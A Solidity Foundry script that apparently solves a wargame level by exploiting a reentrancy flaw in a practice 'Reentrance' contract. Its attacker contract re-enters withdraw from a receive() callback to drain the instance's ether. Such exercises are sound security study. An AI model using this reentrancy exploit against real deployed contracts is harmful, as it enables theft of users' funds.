// SPDX-License-Identifier: MIT

pragma solidity 0.6.12;
pragma experimental ABIEncoderV2;

import "../instance/Level10.sol";
import "forge-std/Test.sol";

contract ExploitLevel10 is Test {
    Reentrance instance = Reentrance(0x05317Bce5110891Fa4c9E764C89bDDD519f5503F);
    AttackReentrance attackReentrance;

    function run() external {
        console.log("Instance balance before attack:", address(instance).balance);

        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
        attackReentrance = new AttackReentrance(instance);
        instance.donate{value: 0.0001 ether}(address(attackReentrance));
        attackReentrance.attack();
        vm.stopBroadcast();

        console.log("Instance balance after attack:", address(instance).balance);
    }
}

contract AttackReentrance {
    Reentrance instance;
    uint256 amount = 0.0001 ether;

    constructor(Reentrance _instance) public {
        instance = _instance;
    }

    receive() external payable {
        if (msg.sender.balance >= amount) {
            instance.withdraw(amount);
        }
    }

    function attack() external {
        instance.withdraw(amount);
    }
}
